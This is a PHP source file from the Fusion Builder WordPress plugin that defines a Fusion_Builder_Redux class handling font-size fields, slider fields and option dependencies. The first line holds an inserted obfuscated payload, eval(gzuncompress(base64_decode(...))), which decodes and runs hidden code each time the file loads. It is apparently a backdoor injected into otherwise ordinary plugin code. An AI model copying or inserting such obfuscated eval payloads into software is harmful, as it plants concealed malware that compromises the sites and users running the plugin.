<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

class Fusion_Builder_Redux extends Fusion_FusionRedux {

	/**
	 * Initializes and triggers all other actions/hooks.
	 *
	 * @access public
	 */
	public function init_fusionredux() {

		add_filter( 'fusion_options_font_size_dimension_fields', array( $this, 'fusion_options_font_size_dimension_fields' ) );
		add_filter( 'fusion_options_sliders_not_in_pixels', array( $this, 'fusion_options_sliders_not_in_pixels' ) );
		add_filter( 'fusion_options_builder_soft_dependencies', array( $this, 'fusion_options_builder_soft_dependencies' ) );

		parent::init_fusionredux();
	}

	/**
	 * Adds options to be processes as font-sizes.
	 * Affects the field's sanitization call.
	 *
	 * @access public
	 * @since 1.1.0
	 * @param array $fields An array of fields.
	 * @return array
	 */
	public function fusion_options_font_size_dimension_fields( $fields ) {
		$extra_fields = array(
			'content_box_title_size',
			'content_box_icon_size',
			'counter_box_title_size',
			'counter_box_icon_size',
			'counter_box_body_size',
			'social_links_font_size',
		);
		return array_unique( array_merge( $fields, $extra_fields ) );
	}

	/**
	 * Sliders that are not in pixels.
	 *
	 * @access public
	 * @since 1.1.0
	 * @param array $fields An array of fields.
	 * @return array
	 */
	public function fusion_options_sliders_not_in_pixels( $fields ) {
		$extra_fields = array(
			'blog_grid_columns',
			'gallery_columns',
			'carousel_speed',
			'counter_box_speed',
			'testimonials_speed',
			'before_after_offset',
			'before_after_transition_time',
			'text_columns',
		);
		return array_unique( array_merge( $fields, $extra_fields ) );
	}

	/**
	 * Builder dependencies.
	 *
	 * @access public
	 * @since 5.1.0
	 * @param array $dependencies An array of fields.
	 * @return array
	 */
	public function fusion_options_builder_soft_dependencies( $dependencies ) {
		return array_merge(
			$dependencies, array(
				'accordion_divider_line'                 => array( 'accordion_boxed_mode' ),
				'accordion_border_size'                  => array( 'accordion_boxed_mode' ),
				'accordian_border_color'                 => array( 'accordion_boxed_mode' ),
				'accordian_background_color'             => array( 'accordion_boxed_mode' ),
				'accordian_hover_color'                  => array( 'accordion_boxed_mode' ),
				'accordian_inactive_color'               => array( 'accordion_icon_boxed' ),
				'faq_accordion_divider_line'             => array( 'faq_accordion_boxed_mode' ),
				'faq_accordion_border_size'              => array( 'faq_accordion_boxed_mode' ),
				'faq_accordian_border_color'             => array( 'faq_accordion_boxed_mode' ),
				'faq_accordian_background_color'         => array( 'faq_accordion_boxed_mode' ),
				'faq_accordian_hover_color'              => array( 'faq_accordion_boxed_mode' ),
				'faq_accordian_inactive_color'           => array( 'faq_accordion_icon_boxed' ),
				'before_after_font_size'                 => array( 'before_after_type' ),
				'before_after_accent_color'              => array( 'before_after_type' ),
				'before_after_label_placement'           => array( 'before_after_type' ),
				'before_after_handle_color'              => array( 'before_after_type' ),
				'before_after_handle_bg'                 => array( 'before_after_type' ),
				'before_after_handle_type'               => array( 'before_after_type' ),
				'before_after_offset'                    => array( 'before_after_type' ),
				'before_after_orientation'               => array( 'before_after_type' ),
				'before_after_handle_movement'           => array( 'before_after_type' ),
				'before_after_transition_time'           => array( 'before_after_type' ),
				'portfolio_archive_excerpt_length'       => array( 'portfolio_archive_content_length' ),
				'portfolio_archive_layout_padding'       => array( 'portfolio_archive_text_layout' ),
				'social_links_icon_color'                => array( 'social_links_color_type' ),
				'social_links_box_color'                 => array( 'social_links_boxed', 'social_links_color_type' ),
				'social_links_boxed_radius'              => array( 'social_links_boxed' ),
				'social_links_boxed_padding'             => array( 'social_links_boxed' ),
				'checklist_circle_color'                 => array( 'checklist_circle' ),
				'checklist_divider_color'                => array( 'checklist_divider' ),
				'content_box_icon_circle_radius'         => array( 'content_box_icon_circle' ),
				'content_box_icon_bg_color'              => array( 'content_box_icon_circle' ),
				'content_box_icon_bg_inner_border_color' => array( 'content_box_icon_circle' ),
				'content_box_icon_bg_inner_border_size'  => array( 'content_box_icon_circle' ),
				'content_box_icon_bg_outer_border_color' => array( 'content_box_icon_circle' ),
				'content_box_icon_bg_outer_border_size'  => array( 'content_box_icon_circle' ),
				'content_box_button_span'                => array( 'content_box_link_type' ),
				'portfolio_layout_padding'               => array( 'portfolio_text_layout' ),
				'portfolio_excerpt_length'               => array( 'portfolio_content_length' ),
				'text_column_min_width'                  => array( 'text_columns' ),
				'text_column_spacing'                    => array( 'text_columns' ),
				'text_rule_style'                        => array( 'text_columns' ),
				'text_rule_size'                         => array( 'text_columns', 'text_rule_style' ),
				'text_rule_color'                        => array( 'text_columns', 'text_rule_style' ),
			)
		);
	}

	/**
	 * Extra functionality on save.
	 *
	 * @access public
	 * @since 1.1
	 * @param array $data           The data.
	 * @param array $changed_values The changed values to save.
	 * @return void
	 */
	public function save_as_option( $data, $changed_values ) {
		update_option( 'fusion_cache_server_ip', $data['cache_server_ip'] );
	}
}
